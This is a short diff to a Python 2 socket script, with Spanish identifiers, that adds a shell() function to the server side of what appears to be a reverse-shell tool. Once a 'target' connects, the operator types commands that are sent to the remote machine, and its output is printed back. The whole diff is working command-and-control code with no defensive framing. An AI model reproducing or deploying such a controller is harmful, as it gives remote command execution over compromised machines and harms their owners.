@@ -3,6 +3,18 @@
 
 import socket
 
+def shell():
+    current_dir = target.recv(1024)
+    while True:
+        comando = raw_input("{}~#: ".format(current_dir))
+        if comando == "exit":
+            target.send(comando)
+            break
+        else:
+            target.send(comando)
+            res = target.recv(1024)
+            print(res)
+
 def upserver():
     global server
     global ip
@@ -19,4 +31,5 @@ def upserver():
     print("Conexion recibida de: " + str(ip[0]))
 
 upserver()
+shell()
 server.close()
